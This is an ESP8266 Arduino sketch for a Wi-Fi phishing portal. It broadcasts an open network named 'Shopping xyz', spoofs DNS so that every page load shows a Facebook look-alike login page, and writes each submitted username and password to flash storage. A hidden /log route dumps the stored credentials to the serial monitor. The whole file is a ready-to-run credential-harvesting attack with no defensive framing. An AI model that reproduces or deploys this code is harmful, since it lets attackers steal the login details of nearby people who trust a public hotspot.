// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <FS.h>

// Default SSID name
const char* SSID_NAME = "Shopping xyz";

// Credentials file
String credentialsFile = "/credentials.txt";

// Gateway
IPAddress APIP(172, 0, 0, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

bool render(String path) {
  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    size_t sent =  webServer.streamFile(file, "text/html");
    file.close();
    return true;
  }
  Serial.println("\nFile " + path + " Not Found: ");
  return false;
}

String saveCredentials() {
  String credentials = webServer.arg("login") + "|" + webServer.arg("pass");

  File file = SPIFFS.open(credentialsFile, "w");
  
  if (!file) { return "\nError opening file for writing"; }
  int bytesWritten = file.print(credentials);
  if (bytesWritten == 0) { return "\nFile write failed"; }
  
  file.close();
  return "<h1> Login realizado com sucesso! </h1>";
}

void showCredentials()
{
  File file = SPIFFS.open(credentialsFile, "r");
  
  if (!file) { Serial.println("\nFailed to open file for reading"); }
  
  Serial.println("\nCredentials :");
  while (file.available())
  {
    Serial.write(file.read());
  }
  file.close();
}

void setup() {
  // Serial begin
  Serial.begin(115200);
  SPIFFS.begin();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  // Start webserver
  dnsServer.start(53, "*", APIP); // DNS spoofing (Only for HTTP)

  webServer.on("/login",[]() {
    webServer.send(200, "text/html", saveCredentials());
  });

  webServer.on("/log",[]() {
    showCredentials();
    webServer.send(200, "text/html", "<h1>Go to serial monitor</h1>");
  });
  
  webServer.onNotFound([]() {
    render("/pages/facebook.html");
  });
  
  webServer.begin();
}

void loop() {
  // put your main code here, to run repeatedly:  
  dnsServer.processNextRequest();
  webServer.handleClient();
  delay(10);
}
